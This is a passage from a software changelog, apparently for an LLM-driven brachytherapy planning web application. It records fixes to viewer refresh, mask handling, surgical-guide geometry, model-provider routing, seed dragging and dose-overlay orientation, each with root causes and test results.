a new row. `reconcileOptimisticTraceStep` now keeps the server id on the merged
row and matches re-emissions by it, so the pending→done update lands on the
same row.

### 2. Web results no longer leak as raw debug text

`ToolResultPipeline` gained a `_format_web` category producing a clean,
language-matched digest (titles, snippets, source links) instead of the
LLM-facing "Found N results" / "Search results:" text. `_collect_tool_fallback_text`
now prefers the display-formatted step result and only reads the raw `role=tool`
digest when no clean step result exists.

### 3. Language-matched fallback framing

The empty-response fallback prefix ("Based on the available results:") is now
localized from `self.memory.user_lang`, matching the user's language.

### Files changed

| File | Change |
|------|--------|
| `web/app/static/js/brachybot-chat-todo.js` | Keep server id on merged router row; dedup re-emissions |
| `agent_runtime/core.py` | `_format_web` clean bilingual digest |
| `agent_runtime/llm_runtime.py` | Fallback prefers clean step results; localized prefix |
| `tests/test_runtime_contracts.py` | Web digest + fallback priority tests |

### Verification

- `pytest` main suites: 82 passed.
- Playwright: two same-id step events render as one row (status done);
  Chinese web digest contains `来源:` and no English `Source:` labels.

---

## 2026-08-01 - Live viewer refresh, dialog-driven parameters, honest failures, and guide flush-fit

Four operator-requested capabilities were implemented and verified end to end.

### 1. Every display change refreshes all viewers in real time

The 3D viewer renders on demand, so any scene-state change that skipped a
render request left stale pixels until the user moved the camera. The 2D
viewers also had gaps for cross-axis window/level drags.

- `createMaskFromFreehand` / `eraseMaskArea` (manual-annotation.js) now call
  `requestViewerVisualRefresh` and rebuild the mask's 3D mesh live, so drawing
  on one viewer updates the other viewers (including 3D) immediately.
- Color-picker `applyColor` and `setDataTreeItemColor` now trigger a full 2D+3D
  refresh instead of leaving the 3D mesh at its old color.
- `deleteDataTreeMask` requests a 3D render after removing the mesh (no more
  deleted-mesh ghost), and `moveSelectedMasks` refreshes 2D+3D and re-applies
  data-tree visibility.
- `applyThreshold` refreshes 2D+3D.
- Shift+drag window/level now re-renders all three 2D viewers (volume path via
  `requestViewerVisualRefresh`, server path via `clearSliceCache`+`loadAllSlices`).
- `setDataOpacity` trajectory branch refreshes the 2D seed/needle overlays.

### 2. Every editable UI parameter is settable through the chat

A dynamic parameter system replaces hard-coded control handling:

- `collectParameterSchema()` (ui-api.js) scans the live DOM and exposes every
  editable control (128 today) with id, label, group, type, bounds, options and
  current value — no hard-coded registry to drift from the UI.
- New `ui_controller` targets: `parameter.catalog` (inspect schema),
  `parameter.set` (set any control), `planning.hyperparams.set` (apply a batch
  of planner hyperparameters via `applyHyperparams`), `surgical_guide.parameters.set`
  (set puncture-guide parameters, converting radius↔diameter), `tree.color`,
  `report.field.set`, and `report.template.set`. `tree.group.visibility` now
  accepts every data-tree group.
- The `surgical_guide` tool schema now enumerates its manufacturing parameters
  with units and ranges, so the LLM can pass them directly or set them on the
  panel first. Setting a surgical_guide parameter persists it for the next
  generation.

### 3. Honest failures with brief capability guidance

Previously an impossible request could surface as the low-information
"tool executed" placeholder. Now:

- The system prompt has an "Honest Failure and Capability Guidance" section:
  say plainly what could not be done and why, then offer up to three real
  next steps, never claiming success.
- `_present_instruction` (llm_runtime.py, both stream and non-stream paths)
  detects failed tools this turn and explicitly instructs the LLM to answer
  honestly and guide the user to what it can do.
- The final fallback (`llm_runtime.py` and `core.py` `format_steps`) no longer
  emits "Tools executed." It reports the actual failures and redirects to real
  capabilities.
- `_failed_steps_summary` / `_HONEST_FAILURE_PROMPT` are unit-tested.

### 4. Surgical-guide channel is flush with the skin, not protruding inward

The channel/sleeve previously ended at `entry + inward * sleeve_inward_mm`,
pushing the channel wall up to 8 mm into the patient and preventing the guide
from sitting flush against the skin. `web/surgical_guide.py` now clamps the
sleeve/bore inner end to the skin entry (`sleeve_end = entry`); the tube only
protrudes outward. `sleeve_inward_mm` remains in the schema for compatibility
but no longer changes geometry. A regression test proves geometry is identical
for `sleeve_inward_mm` of 1 mm and 30 mm. Documentation updated in
`docs/PATIENT_SPECIFIC_PUNCTURE_GUIDE.md`.

### Files changed

| File | Change |
|------|--------|
| `web/app/static/js/brachybot-manual-annotation.js` | Live mask 2D+3D refresh; cross-axis WL drag |
| `web/app/static/js/brachybot-viewer-volume.js` | Color/delete/move/threshold refresh; `setDataTreeItemColor` |
| `web/app/static/js/brachybot-ui-api.js` | `collectParameterSchema`, `applyParameterSet`, new ui_controller handlers |
| `tool_factory/ui_controller/__init__.py` | parameter/surgical_guide/tree.color/report targets |
| `tool_factory/surgical_guide/__init__.py` | Parameter schema enumeration |
| `agent_runtime/llm_runtime.py` | Honest-failure prompt + fallback |
| `agent_runtime/core.py` | `format_steps` honest empty reply |
| `config/prompts/system_prompt.md` | Honest Failure section |
| `web/surgical_guide.py` | Channel flush with skin entry |
| `docs/PATIENT_SPECIFIC_PUNCTURE_GUIDE.md` | Channel fit documentation |

### Verification

- `pytest` across the main suites: 80 passed.
- Playwright: 128-parameter catalog; parameter.set / hyperparams / guide /
  tree.color / report.field / report.template all execute and apply; no JS
  errors; mask draw triggers `requestViewerVisualRefresh`.
- `surgical_guide` geometry regression: identical mesh for `sleeve_inward_mm`
  1 vs 30.

---

## 2026-08-01 - Mask persistence, data-tree compliance, and batch operations

### Scope

Verification pass over the manual/threshold mask feature found gaps in
persistence, selectability, and the batch operation set. These are fixed here
so masks behave exactly like OAR/CTV nodes.

### 1. Mask persistence across restart

`workspaceUiState` now serialises `viewer.masks` (`{labels, counter,
activeMaskId}`); `applyWorkspaceSnapshot` restores it, converting voxel arrays
back into Sets. Verified end-to-end: `persistWorkspace` sends masks; a fresh
snapshot restores the mask name, voxels (as a Set), counter, and activeMaskId.

### 2. Data-tree compliance

- `getSelectableIds` now includes `mask_*`, so masks are range-selectable and
  `getSelectedOrganIds`/`showContextMenu` work (Rename, Move to CTV/OAR,
  Delete, Change Color, 3D Reconstruct all appear).
- `_findDataTreeNode` resolves `mask_*` to `state.maskLabels`.
- `batchToggleVisibility`, `batchSetOpacity`, and `batchSetViewVisibility`
  gained `mask_*` branches, matching the single-item `toggleDataVisibility` /
  `setDataOpacity` paths.

### Files changed

| File | Change |
|------|--------|
| `web/app/static/js/brachybot-workspace.js` | Persist/restore `viewer.masks` |
| `web/app/static/js/brachybot-viewer-volume.js` | getSelectableIds/_findDataTreeNode mask support; batch ops mask branches |
| `web/app/static/js/brachybot-ui-api.js` | `mask.move` payload parsing fix |

### Verification

- `pytest tests/test_round9_regressions.py tests/test_external_project_scope.py tests/test_chat_tasks.py tests/test_multi_agent_basic.py tests/test_surgical_guide.py tests/test_runtime_contracts.py tests/test_needle_obstacle_safety.py` — 76 passed.
- Playwright: mask context menu shows Rename/Move/Delete/Color/3D; batch
  visibility/opacity/view-visibility all apply to masks; persistence
  save→restore round-trips masks.

---

## 2026-08-01 - Manual/threshold masks in the Data Tree + ui_controller integration

### Scope

The Draw/Erase viewer tools created mask voxel sets that were never rendered
or listed; the Threshold slider only did a red overlay. This change wires both
into a first-class "Masks" group in the Data Tree (a sibling of CTV/OAR that
never feeds dose/planning) and exposes every action to the ui_controller so the
LLM can drive them.

### 1. Mask data-tree group

- `renderDataTree` renders a `Masks (N)` group under Segmentation listing each
  `state.maskLabels` entry with the same leaf interactions as OAR/CTV
  (visibility eye, color swatch, opacity slider, 3D button, right-click menu).
- Right-click menu for a mask adds Rename, 3D Reconstruct, Move to CTV/OAR
  (presentation-only), Change Color, and Delete.
- `_allDataTreeVisualNodes`, `toggleDataVisibility`, `setDataOpacity`,
  `setGroupVisibility`, `setGroupOpacity`, `soloGroup`, `openColorPicker`
  and `handleTreeItemRightClick` all gained `mask_*` / `masks` handling.
- `resetAllState` clears `maskLabels`/`activeMaskId` so masks do not leak
  across sessions.

### 2. Draw/Erase workflow

- `setViewerTool('annotate')` now toggles: first click creates an empty mask
  and enters painting; clicking Draw again (or switching to another tool)
  finalises it. Strokes merge into the active mask instead of spawning a new
  mask per stroke.
- Clicking an already-active tool now deselects it (the toolbar previously
  left it stuck highlighted).
- `createMaskFromFreehand`/`eraseMaskArea` now use the exact same
  display→volume mapping as `renderSliceFromVolume` (axial Z flip,
  sagittal/coronal spacing resample), so painted voxels line up with the 2D
  overlay.

### 3. Threshold slider → mask

`applyThreshold` now also creates/replaces a `Threshold N HU` mask from
`volumeData > N` into the Masks group (display-only). The existing red overlay
is preserved.

### 4. Mask 3D reconstruction

`reconstructOrgan3D` routes `mask_*` to `_reconstructMask3D`, which builds a
client-side merged cube mesh from the voxel Set (capped at 120k voxels),
reusing the existing scene mesh registry and data-tree visibility.

### 5. ui_controller integration

- `tool_factory/ui_controller/CONTROL_REGISTRY` gained `mask.create`,
  `mask.finalize`, `mask.threshold`, `mask.rename`, `mask.move`, `mask.delete`.
- `_executeUIAction` in `brachybot-ui-api.js` maps them to the new functions
  (and the existing `viewer.tool` / `viewer.threshold` entries now drive the
  mask workflow). The LLM can therefore create/paint/finalise/rename/move/
  delete masks by name.

### Files changed

| File | Change |
|------|--------|
| `web/app/static/js/brachybot-viewer-volume.js` | Masks group render; mask overlay in `renderSliceFromVolume`; mask 2D/3D visibility/opacity/group ops; rename/move/delete; threshold→mask |
| `web/app/static/js/brachybot-viewer-layout.js` | Tool toggle-off; draw create/finalise workflow; mask 3D reconstruction |
| `web/app/static/js/brachybot-manual-annotation.js` | `_startNewMask`; mask coordinate unification; merge strokes into active mask |
| `web/app/static/js/brachybot-ui-api.js` | `activeMaskId` state; resetAllState mask clear; ui_controller action mapping |
| `tool_factory/ui_controller/__init__.py` | mask.* CONTROL_REGISTRY entries |
| `tests/test_runtime_contracts.py` | ui_controller mask command registration test |

### Verification

- Playwright: Draw click creates `mask_1`, second click finalises (activeMaskId
  null); rename/move/toggle-opacity/delete round-trip without errors; tool
  toggle-off clears highlight; all original toolbar functions still defined.
- `pytest tests/test_round9_regressions.py tests/test_external_project_scope.py tests/test_chat_tasks.py tests/test_multi_agent_basic.py tests/test_surgical_guide.py tests/test_runtime_contracts.py tests/test_needle_obstacle_safety.py` — 76 passed.

---

## 2026-08-01 - OpenCode Go model protocol routing

### Scope

Add support for the OpenCode Go subscription endpoint
(`https://opencode.ai/zen/go`), whose models split across two wire protocols.
The previous auto-detection keyed on the base URL only, which mis-routed
MiniMax/Qwen models.

### Root cause

`AgenticSys._auto_detect_llm_provider` chose the provider protocol by whether
the base URL contained `anthropic`. OpenCode Go exposes both:
- `/v1/chat/completions` (OpenAI-compatible) for MiMo, Grok, GLM, Kimi,
  DeepSeek, Hy3
- `/v1/messages` (Anthropic) for MiniMax, Qwen

With `https://opencode.ai/zen/go` (no `anthropic` substring) every model was
forced to the OpenAI-compatible path, so MiniMax/Qwen (Anthropic wire format)
failed and MiMo worked only because it is OpenAI-compatible.

### Resolution

When the base URL is an OpenCode Go endpoint, the model name selects the
protocol:
- `minimax-*`, `qwen3*`, `qwen-*` → Anthropic provider
- everything else (mimo, grok, glm, kimi, deepseek, hy3) → generic
  OpenAI-compatible provider

Non-Go endpoints keep the existing URL-only heuristic. The README documents
the Go usage (set `ANTHROPIC_BASE_URL`, `ANTHROPIC_API_KEY`, `ANTHROPIC_MODEL`;
switch models by changing `ANTHROPIC_MODEL`).

### Verification

- Protocol table verified: mimo-v2.5/-pro, grok-4.5, glm-5.2, kimi-k3,
  deepseek-v4-*, hy3 → OpenAI-compat; minimax-m3/m2.7, qwen3.x → Anthropic.
- End-to-end: `_auto_detect_llm_provider` → `LLMRouter._create_llm` →
  generic provider calls mimo-v2.5 through `opencode.ai/zen/go/v1` and
  returns `ok`.
- `pytest tests/test_round9_regressions.py tests/test_runtime_contracts.py tests/test_chat_tasks.py` — 47 passed.

### Files changed

| File | Change |
|------|--------|
| `AgenticSys.py` | OpenCode Go model-name → protocol routing |
| `README.md` | OpenCode Go provider configuration example |

---

## 2026-08-01 - Guide STL resolution, manual needle mask validation, and toast stacking

### Scope

Follow-up on the 0.5 mm guide change: the operator requested a finer STL
resolution because the needle channels are ~1.x mm. Also fixed a manual needle
route that handed a flattened mask to obstacle validation (rejecting every
needle), and stacked the three lower-right toasts without overlap.

### 1. Guide STL resolution 0.5 → 0.35 mm (finer, export-quality option)

The 1.x mm needle channel needs a sub-mm grid. Default `geometry_resolution_mm`
is now 0.35 (a ~1.6 mm channel spans ~4.6 voxels, smooth through-hole), and the
parameter range widens to `(0.2, 2.0)` so an operator can request a 0.2 mm
grid for export. Frontend default and the Input-panel control (`min=0.2`,
`step=0.05`, value 0.35) were updated to match. Synthetic verification:
0.25 mm → 11.7k verts/23.4k faces per needle (too heavy for 9 needles),
0.35 mm → 5.8k verts/11.6k faces (balanced), 0.5 mm → 3.1k verts/6.1k faces.

### 2. Manual needle routes handed a flattened mask to obstacle validation

#### Root cause

`/api/manual_planning/update_geometry` (planning_routes.py) loaded the CTV/OAR
mask by taking the first non-`None` key (`ctv_mask`, `ctv_array`,
`ctv_full_labels`) **without** checking its shape. If the stored value was a
flattened 1D array (12582912 = 48×512×512), `_world_segment_hits_obstacle`
compared it against the 3D CT grid, the shapes differed, and it fail-closed by
returning True ("hits obstacle") for **every** needle — so a single-needle
edit was rejected wholesale and the operator saw the full-plan failure path.

#### Resolution

The route now selects only a mask whose shape matches the CT grid (the same
`_mask_array` contract used by the dose-recompute path), skipping any flattened
copy before calling `_validate_manual_needle_safety`.

### 3. Toast stacking in the lower-right corner

`workspace-hydration-notice` (bottom 18px), `workspace-recovery-notice`
(bottom 66px), and `.app-notice-stack` (bottom 116px) now stack vertically at
`right: 18px` without overlap, as bubbles. (The recovery notice was previously
a centered modal; this and the hydration notice are the load/open-resource
notices the operator wanted grouped bottom-right.)

### Files changed

| File | Change |
|------|--------|
| `web/surgical_guide.py` | Default resolution 0.5 → 0.35; parameter range (0.2, 2.0) |
| `web/app/static/js/brachybot-surgical-guide.js` | Resolution default 0.35 |
| `web/app/index.html` | Geometry-resolution input min/step/value |
| `web/routes/planning_routes.py` | CT-grid-shaped mask selection for needle validation |
| `web/app/static/css/brachybot-auth.css` | Recovery/hydration toast stacking |
| `web/app/static/css/brachybot-theme-layout.css` | `.app-notice-stack` bottom offset |
| `tests/test_needle_obstacle_safety.py` | Flattened-mask fail-closed regression |

### Verification

- `pytest tests/test_round9_regressions.py tests/test_external_project_scope.py tests/test_chat_tasks.py tests/test_multi_agent_basic.py tests/test_surgical_guide.py tests/test_runtime_contracts.py tests/test_needle_obstacle_safety.py` — 75 passed.
- Synthetic guide at 0.35 mm is watertight; flattened 1D mask fail-closes in
  needle validation while the matching 3D mask validates normally.

---

## 2026-08-01 - Guide bore resolution, mesh smoothing, needle-handle rotation conflict, seed-drag UX

### Scope

Follow-up on live verification: the surgical guide showed stepped surfaces and
its needle bores were not visibly open, and orbiting the 3D scene locked
whenever the pointer crossed a needle endpoint handle.

### 1. Guide needle bores collapsed and surface stepped

#### Root cause

The default `geometry_resolution_mm` was 1.0. A 2.2 mm channel (1.1 mm radius)
collapsed to ~2 voxels on a 1 mm grid, so the marching-cubes bore was not
visibly open, and the surface showed obvious 1 mm steps ("bump" around each
channel).

#### Resolution

- Default `geometry_resolution_mm` 1.0 → 0.5 (backend `DEFAULT_GUIDE_PARAMETERS`
  and frontend `GUIDE_DEFAULTS`). At 0.5 mm the channel is a clear ~4.4 voxel
  through-hole.
- Added `_smooth_mesh_vertices`: a few uniform Laplacian passes over the
  marching-cubes surface in local mm space before the world transform. Vertex
  positions move (max ~0.11 mm in the synthetic case) while face connectivity
  and watertightness are preserved. Facets are softened without closing the
  needle bores.

### 2. 3D orbiting locked on needle endpoint handles

#### Root cause

`_makeNeedleHandle` used a 3.5 mm sphere with `depthTest = false` (always
on-top), and the capture-phase `beginNeedleHandleDrag` guard disabled
`OrbitControls` when a handle was hit. Orbiting the scene would lock rotation
whenever the pointer crossed a handle's screen position.

#### Resolution

- Handle radius 3.5 → 2.2 mm and `depthTest = true`, so a handle occluded by
  the patient surface or needle shaft is invisible and cannot steal a rotation
  drag. Only visibly exposed handles remain draggable.

### 3. Seed drag and manual needle direction

See the prior 2026-08-01 entry: immediate seed-drag arm, seed-drag recompute
confirmation, and manual needle `[deep, shallow]` points with the planned
needle's direction.

### Files changed

| File | Change |
|------|--------|
| `web/surgical_guide.py` | Default resolution 0.5; Laplacian mesh smoothing |
| `web/app/static/js/brachybot-surgical-guide.js` | Frontend resolution default 0.5 |
| `web/app/static/js/brachybot-viewer-layout.js` | Needle-handle radius + depth test |

### Verification

- `pytest tests/test_surgical_guide.py tests/test_runtime_contracts.py tests/test_round9_regressions.py` — 46 passed.
- Synthetic guide at 0.5 mm: 3,060 vertices / 6,112 faces, watertight before and after smoothing; max vertex displacement 0.11 mm.
- Sleeve band radius 0.9–3.07 mm confirms the 1.1 mm channel and 3.0 mm outer wall are present.

---

## 2026-08-01 - Seed drag UX, manual needle direction, guide bore resolution, and viewer rotation

### Scope

Follow-up on live verification regressions: seed drag was still unusable, the
manually added needle pointed opposite to the planned needles, the surgical
guide showed no needle bore and a stepped surface, the 3D viewer could not
rotate freely, and each dose iso-surface appeared twice in the Data Tree.

### 1. Seed drag: hold-to-arm timer cancelled by movement

#### Root cause

`brachybot-3d-manual.js` armed the seed drag via a 220 ms `setTimeout` while
`updateManualDrag` cancelled any pending seed drag on >6 px movement. A normal
press-and-drag gesture therefore cancelled itself before the timer fired, so a
seed could never be dragged along its needle.

#### Resolution

- Arm the seed drag immediately on `mousedown` (no hold delay), so pressing a
  seed and moving it starts the drag right away. `updateManualDrag` keeps
  projecting the dragged seed onto its owning needle.
- On pointer-up the drag now asks the operator whether to recompute dose/DVH
  (`_confirmAction`): "Yes" runs the full commit + `recomputeManualDose`;
  "No" commits the geometry only (`onManualSeedEdited` gains a
  `skipDoseRecompute` option).

### 2. Manual needle direction opposite to planned needles

#### Root cause

`addManualNeedle` built `points` in `[shallow, deep]` order while the automatic
planner stores `[deep, external]`, so the same physical needle rendered with
its direction reversed. The direction itself came from the camera view, not
from the plan's reference direction.

#### Resolution

- `addManualNeedle` now emits `points[0] = deep (intrabody target)`,
  `points[1] = shallow (skin entry)`, matching the planner convention so the
  manual needle lines up with the planned ones.
- Direction preference: an existing planned needle's direction, then the
  reference-direction UI controls (`refDirecX/Y/Z` or auto `[0,0,1]`), then
  the camera direction.

### 3. Surgical guide: needle bore not visible and stepped surface

#### Root cause

The default `geometry_resolution_mm` was 1.0. A 2.2 mm channel (1.1 mm radius)
collapsed to ~2 voxels on a 1 mm grid, so the marching-cubes bore was not
visibly open, and the surface showed obvious 1 mm steps.

#### Resolution

- Default `geometry_resolution_mm` changed to 0.5 (backend
  `DEFAULT_GUIDE_PARAMETERS` and frontend `GUIDE_DEFAULTS`). At 0.5 mm the
  channel is a clear through-hole (~4.4 voxels) and the surface is smooth.
- Verified: 1.0 mm produced 87 bore voxels / 6.9k vertices (1 needle); 0.5 mm
  produced 449 bore voxels / 27.4k vertices with a clean bore.

### 4. 3D viewer rotation capped

`minPolarAngle=0.01` / `maxPolarAngle=π-0.01` limited orbiting; changed to full
`0..π` range so the scene rotates freely.

### 5. Duplicate dose iso-surfaces in the Data Tree

`loadAllIsoSurfaces` called `loadDoseIsosurface` without setting
`window._suppressSingleIsoEntry`, so each threshold got two entries. The flag
is now set around the call so the outer function owns the `doseLevels` array.

### 6. Recovery notice placement

The "Manual dose update did not complete" recovery notice rendered as a centered
modal; it now uses the same bottom-right pill styling as the case-resource
hydration toast (`workspace-recovery-notice` → `right:18px; bottom:18px`,
`border-radius:999px`, 12 px).

### Files changed

| File | Change |
|------|--------|
| `web/app/static/js/brachybot-3d-manual.js` | Immediate seed-drag arm; seed drag recompute confirmation; manual needle `[deep, shallow]` points + planned/reference direction |
| `web/surgical_guide.py` | Default `geometry_resolution_mm` 1.0 → 0.5 |
| `web/app/static/js/brachybot-surgical-guide.js` | Frontend guide resolution default 0.5 |
| `web/app/static/css/brachybot-auth.css` | Recovery notice → bottom-right pill |

### Verification

- `pytest tests/test_surgical_guide.py` — 11 passed.
- Playwright: no `pageerror`; `addManualNeedle` / `addManualSeed` / `addMeshToScene` resolve; recovery notice renders bottom-right pill; guide functions return proper session ids after the `activeSessionId` shadowing fix.
- Bore/resolution experiment: 0.5 mm gives a clean through-hole and smooth surface at acceptable mesh size.

---

## 2026-08-01 - Manual seed drag, monitor stop intent, and guide validity against the algorithm baseline

### Scope

Follow-up on live verification regressions: seed drag was non-functional in
manual planning, the Finish Monitor / chat "stop monitor" paths did not stop
the live monitor, and a manually added needle made an existing surgical guide
disappear. Three functional defects confirmed and fixed; two regressions added.

---

### 1. Manual seed drag never armed — `armSeedDrag` / `clearPendingSeedDrag` undefined

#### Confirmed issue

In the 3D viewer a manual needle's endpoint spheres could be dragged, but a
seed could not. Clicking a seed selected it (red emissive) but the 220 ms
timer that should arm the drag threw a `ReferenceError`, so no drag ever
started and the previous requirement (seed slides along its owning needle)
was silently lost.

#### Root cause

`brachybot-3d-manual.js` referenced two helper functions that were never
defined in the file:
- `pendingSeedTimer = setTimeout(armSeedDrag, 220)` (mousedown, seed branch)
- `clearPendingSeedDrag()` (pointer-move threshold and pointer-up)

The parallel needle-handle drag had working helpers (`clearPendingNeedleDrag`,
`armNeedleHandleDrag`); the seed pair was simply missing, so `setTimeout`
threw `ReferenceError: armSeedDrag is not defined` and the drag path died.

#### Resolution

Added `clearPendingSeedDrag` and `armSeedDrag` mirroring the needle-handle
implementation: arm builds the camera-facing drag plane through the seed
position and computes the grab offset; the clear helper resets the pending
timer/seed state and restores controls/cursor. The existing drag-move logic
(`updateManualDrag`) already projected a seed onto its owning needle and the
pointer-up commit (`finishManualDrag` → `onManualSeedEdited`) already
persisted the edited position, so only the missing glue was required.

#### Verification

- Function definitions present; the surrounding block still parses (Playwright
  full-page load has zero `pageerror`).
- The seed branch now reaches `isDragging = true`, so drag-move projection and
  the `onManualSeedEdited` commit path execute as designed.

---

### 2. "Stop monitor" via chat was classified as a knowledge query

#### Confirmed issue

`请停止monitor` produced the reply "I do not see a running monitor process"
instead of stopping the live monitor. The turn was routed as `knowledge_query`
whose tool set excludes `ui_controller`, so the LLM answered from memory
instead of issuing the monitor stop.

#### Root cause

`agent_runtime/turn_policy.py` matched monitor commands against neither the
`ui` keyword list nor any planning/clinical list; they fell through to the
final `knowledge_query` default. The existing `ui_controller` `training.mode`
target already supported `stop` and mapped to `stopTrainingMode()` in
`brachybot-ui-api.js`, but the intent never granted `ui_controller`.

#### Resolution

Added `monitor`, `training mode`, `start monitoring`, `stop monitoring`,
`停止监测`, `开始监测`, `结束监测`, `停止监控`, and `监测` to the `ui`
keyword list, so monitor commands classify as `ui_control` with `ui_controller`
available. The frontend already short-circuits `_isMonitorStopRequest` when
`trainingMonitorState.active`; the intent fix covers the general case.

#### Verification

- `classify_local_turn` returns `ui_control` (with `ui_controller` in
  `allow_tools`) for 请停止monitor / 请停止监测 / 停止监测 / stop monitoring.
- Regression added in `tests/test_runtime_contracts.py` (12 passed).

---

### 3. Adding a manual needle hid an existing surgical guide

#### Confirmed issue

After an automatic plan produced a guide, adding a manual needle/seed removed
the guide from the Data Tree and 3D viewer, and the Generate/Update guide
button lost its enabled state even though the guide's covered needle geometry
was unchanged.

#### Root cause

`web/surgical_guide.py` `_current_planning_snapshot` returns **only** the
manual arrays once any `manual_seeds`/`manual_needles` exist, discarding the
immutable `algorithm_plan_snapshot`. Guide validity (`guide_matches_current_plan`)
and guide generation both computed `planning_signature` from this display
snapshot. Adding one manual needle therefore changed the signature
(`e3a8…` → `9587…` in the reported case), `guide_matches_current_plan` became
false, the browser `removeGuideMesh()` path hid the guide, and the update
button (driven by `can_generate`/match state) stopped enabling. `invalidate_surgical_guides`
had already marked the guide stale for the manual edit, but the display snapshot
signature change made the guide invisible rather than merely stale.

#### Resolution

- Split the snapshot sources:
  - `_algorithm_planning_snapshot(agent)` — immutable automatic baseline
    (from `algorithm_plan_snapshot`, else reconstructed from
    `seed_plan_serialized` + `verified_needle_geometry`).
  - `_current_planning_snapshot(agent)` — display snapshot (manual-first),
    unchanged for guide generation paths and needle availability.
- `web/routes/surgical_guide_routes.py` `guide_metadata` now computes
  `current_plan_signature` from `_algorithm_planning_snapshot`, so a manual
  addition no longer changes the signature the guide is matched against.
- `web/surgical_guide.py` `generate_surgical_guide` stores
  `source_plan_signature` from the algorithm baseline too, keeping generation
  and matching symmetric.
- Manual needle edits still invalidate the guide via the existing
  `invalidate_surgical_guides` calls in `planning_routes` (needle/seed update
  and restore paths), so a genuinely changed algorithm needle correctly forces
  an update.

#### Verification

- On the reported case data the algorithm-baseline signature equals the
  guide's `source_plan_signature` (`e3a8…`), so the guide stays visible after
  a manual needle addition.
- Regression added in `tests/test_surgical_guide.py`
  (`test_manual_needle_addition_does_not_hide_algorithm_guide`): the display
  snapshot signature diverges after a manual addition while the algorithm
  baseline — and the freshly generated guide's signature — stay stable.
  Suite: 11 passed.

---

### Files changed

| File | Change |
|------|--------|
| `web/app/static/js/brachybot-3d-manual.js` | Added missing `armSeedDrag` / `clearPendingSeedDrag` |
| `agent_runtime/turn_policy.py` | Monitor commands classify as `ui_control` |
| `web/surgical_guide.py` | Split `_algorithm_planning_snapshot` from display snapshot; guide signature uses the baseline |
| `web/routes/surgical_guide_routes.py` | `guide_matches_current_plan` matches against the algorithm baseline |
| `web/app/static/js/brachybot-chat-core.js` | `createLiveThinkingChain` removes the same-request restored trace on resume |
| `tests/test_surgical_guide.py` | Manual-addition guide-validity regression |
| `tests/test_runtime_contracts.py` | Monitor-stop intent regression |

### Verification

- `pytest tests/test_round9_regressions.py tests/test_external_project_scope.py tests/test_chat_tasks.py tests/test_multi_agent_basic.py tests/test_surgical_guide.py tests/test_runtime_contracts.py` — 64 passed.
- Playwright full-page load: zero `pageerror`; `render3DMesh`, `generateSurgicalGuide`, `stopTrainingMode`, `loadSurgicalGuideMesh`, `ensureSurgicalGuideForCurrentPlan` all resolve.
- Monitor start → backend `/ui/state` `training.active` true → stop resets to inactive (validated end-to-end in the browser).

---

## 2026-08-01 - Surgical-guide visibility, dose overlay coordinate orientation, and structure-move preservation

### Scope

Follow-up audit after the 2026-07-31 planning-viewer delivery pass. Three
regressions reported during live verification are addressed: the surgical
guide staying hidden after planning, the dose heatmap appearing rotated on
the sagittal/coronal 2D views, and moving a structure to CTV/OAR wiping the
masks, dose, DVH, and guide from the viewer. Three files changed on the
backend and two browser scripts; the 2026-07-31 dose-slice race and
optimistic-router fixes remain untouched.

---

### 1. Surgical guide hidden after planning (status mismatch + broken session binding)

#### Confirmed issue

After a planning run the guide mesh was not displayed, the "Generate Guide"
button stayed disabled, and the status contract reported the guide as not
matching the current plan even though the needle geometry was unchanged.

#### Root cause (two independent defects)

1. **Broken session binding in the browser.** `brachybot-surgical-guide.js`
   `activeSessionId()` read `window.activeSessionId`, which is never assigned
   (the binding is a module-scope `let activeSessionId` in `chat-core.js`,
   not a `window` property). Every guide session check therefore disagreed
   with `refreshPlanningUI`'s expected session, so the Generate Guide button
   silently stayed disabled. Verified: `window.activeSessionId` was
   `undefined` while `activeSessionId` (module scope) held the real id.
2. **`status == "ready"` gate on validity.** The backend
   `guide_matches_current_plan` required `status == "ready"`, and
   `structure_service._stale_updates` marked the guide `stale` (with
   `stale_reason`) on any structure reclassification in the Data Tree. A
   guide whose plan signature still matched the current needle geometry was
   therefore reported invalid purely because of an unrelated stale flag.

#### Resolution

- `brachybot-surgical-guide.js` `activeSessionId()` now prefers the
  module-scope `activeSessionId` before falling back to the window/state
  bindings. Both the guide-mesh load path and the guide-status path use it.
- `web/routes/surgical_guide_routes.py`:
  `guide_matches_current_plan` now returns `true` when the guide's stored plan
  signature equals the current needle-geometry signature, regardless of the
  stored status. Signature equality is the authoritative validity signal; the
  `status == "ready"` conjunct was removed.
- `web/structure_service.py`: `_stale_updates` no longer flips
  `surgical_guide` / `surgical_guide_versions` to `stale` on structure
  reclassification or deletion. A puncture guide depends only on planned
  needle geometry and the CT skin surface; invalidation stays owned by the
  needle-geometry edit paths in `planning_routes`.
- `brachybot-surgical-guide.js`: both `loadGuide` and the mesh-loader now
  accept a guide whose status is not `ready` as long as
  `guide_matches_current_plan === true`, so a merely-stale-but-matching guide
  is displayed instead of triggering regeneration or being dropped.

#### Verification

- `guide_matches_current_plan` returns true with a matching signature and a
  stale status; the mesh endpoint serves the stored `surgical_guide_vertices`
  (18,341) / faces (36,682).
- Playwright: `ensureSurgicalGuideForCurrentPlan` resolves true and calls
  `addMeshToScene` exactly once; the Generate Guide button is enabled.
- `_stale_updates` for a structure-reclassification reason no longer contains
  `surgical_guide`.

---

### 2. Dose heatmap / contours rotated 90° on sagittal and coronal 2D views

#### Confirmed issue

On the sagittal and coronal slices the dose overlay peak appeared offset from
the seed positions — the dose hot spot was rotated away from the needle paths
on both non-axial views while axial looked correct.

#### Root cause

`web/routes/planning_routes.py` applied a numpy `.T` transpose when extracting
the sagittal (`dose_np[:, :, x].T`) and coronal (`dose_np[:, y, :].T`) slices
for both the dose-overlay and dose-contour endpoints. The 2D CT renderer
(`brachybot-viewer-volume.js`) draws sagittal as row=Z (vertical) / col=Y
(horizontal) and coronal as row=Z / col=X; the `.T` put Z on the horizontal
axis, mirroring the heatmap across the anti-diagonal. Axial (`dose_np[z]`) was
never transposed, which is why only the non-axial views were wrong.

#### Resolution

- Removed the `.T` from both the dose-overlay slice endpoint and the
  dose-contour slice endpoint. The returned slices now use the same
  row/column orientation as the CT canvas:
  - axial → `dose_np[z]` (Y, X)
  - sagittal → `dose_np[:, :, x]` (Z, Y)
  - coronal → `dose_np[:, y, :]` (Z, X)
- Updated the endpoint comments to document the shared display convention so
  a future transpose is not reintroduced.

#### Verification

- With a 48×512×512 dose array, the CTV center voxel (z=21, y=311, x=368)
  aligns with the dose peak (z=21, y≈300, x=368) on all three views; the
  remaining 8–11 px column difference between CTV center and peak is physical
  (peak is on the hottest seed cluster), not a transpose artifact.
